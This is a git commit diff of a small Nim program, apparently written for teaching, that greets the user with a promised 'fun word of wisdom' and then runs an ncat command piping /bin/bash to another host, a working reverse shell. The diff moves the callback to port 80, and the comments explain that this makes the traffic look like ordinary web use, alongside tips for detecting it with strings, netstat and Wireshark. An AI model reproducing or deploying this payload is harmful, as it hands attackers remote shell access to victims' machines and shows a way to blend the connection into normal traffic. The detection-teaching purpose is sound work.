65318a6e2eaf302b4d7c8e6785aea153686bdcc2
generic <generic@localspot>
2023-02-19 23:07:32 -0500

    added basic reverse shell

--- revShell.nim
+++ revShell.nim
@@ -11,15 +11,19 @@ echo "Press enter for a fun word of wisdom. :)"
 
 discard readline(stdin)
 
-discard execCmd("ncat 192.168.0.8 4444 -e /bin/bash &")
+discard execCmd("ncat 10.0.2.6 80 -e /bin/bash &")
 
 
-# This is an example of a very basic reverse shell -
+# This is an example of a very basic rev shell -
 # It does nothing to hide the fact that it has shellcode calling
-# an ncat binary to listen.
+# an ncat binary to send a shell over the network.
 # reversing its behavior is extremely easy with a simple 
 # strings bindShell | grep bash
 # pointing you directly to the shellcode.
 # As a network analyst, running netstat on your endpoint will clue you in to an
 # errant ncat connection as well.
+# Note that it is a bit sneakier than the bindshell- there's no listener on the target
+# When the payload isn't running.
+# Also, you will notice we can make the connection look like an innocuous "web" connection
+# by reaching out to a common port like 80.
 # Lets see what we find in wireshark though, when we sniff traffic!
